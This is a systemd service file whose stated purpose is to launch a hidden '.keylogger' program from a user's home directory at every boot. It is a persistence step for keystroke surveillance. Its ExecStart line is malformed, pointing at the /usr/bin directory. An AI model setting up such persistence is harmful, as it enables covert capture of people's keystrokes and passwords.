# keylogger.service
[Unit]
Description=keylogger

[Service]
ExecStart=/usr/bin "/home/magewe/.keylogger"

[Install]
WantedBy=multi-user.target
